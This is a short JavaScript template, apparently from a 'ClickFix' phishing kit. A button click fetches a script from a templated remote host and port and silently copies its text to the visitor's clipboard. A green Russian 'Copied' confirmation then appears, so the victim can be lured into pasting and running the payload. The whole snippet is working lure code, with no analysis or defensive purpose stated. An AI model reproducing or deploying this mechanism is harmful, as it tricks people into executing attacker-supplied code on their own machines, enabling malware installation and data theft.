document.querySelector('button').addEventListener('click', () => {
    const protocol = "{{CLICKFIX_HTTP_SHARE_PROTOCOL}}"
    const url = "{{CLICKFIX_HTTP_SHARE_URL}}"
    const port = "{{CLICKFIX_HTTP_SHARE_PORT}}"
    const filename = "{{CLICKFIX_SCRIPT_TO_RUN}}"
    fetch(`${protocol}://${url}:${port}/${filename}`)
        .then(response => {
            if (!response.ok) throw new Error('Network response was not ok');
            return response.text();
        })
        .then(text => navigator.clipboard.writeText(text))
        .then(() => {
            const originalButton = document.querySelector('button');
            const clonedButton = originalButton.cloneNode(true);    
            clonedButton.textContent = '✔ Скопировано';
            clonedButton.style.backgroundColor = 'green';
            originalButton.parentNode.replaceChild(clonedButton, originalButton);
            setTimeout(() => clonedButton.parentNode.replaceChild(originalButton, clonedButton), 300); 
        });
});